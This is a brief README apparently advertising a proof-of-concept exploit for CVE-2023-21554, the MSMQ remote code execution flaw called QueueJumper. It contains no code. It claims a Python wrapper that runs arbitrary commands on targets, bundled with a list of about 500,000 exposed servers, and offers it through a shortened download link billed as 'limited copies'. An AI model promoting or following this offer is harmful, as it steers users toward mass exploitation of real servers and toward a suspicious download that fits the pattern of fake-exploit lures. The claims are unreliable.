# CVE-2023-21554-PoC
CVE-2023-21554 unauthenticated RCE in Microsoft Message Queuing (MSMQ) aka QueueJumper


the vulnerablity is within msmq service, in which some popular softwares relies on it,
for example microsoft exchange server, while installing the exchange server by default it automaticaly
enable the msmq service in background
in conclusion all exchange servers atleast are having this vulnerable service running
the port can be exposed to internet/localy

as per scanning the diffirent sources there are ~500000 exposed servers arround the globe
which I included inside this download
and the simple python wrapper which will trigger the vulnerable point, and executes given command

to avoid abuse its available for limited copies. [get it here](http://bit.ly/3MCmQwv)
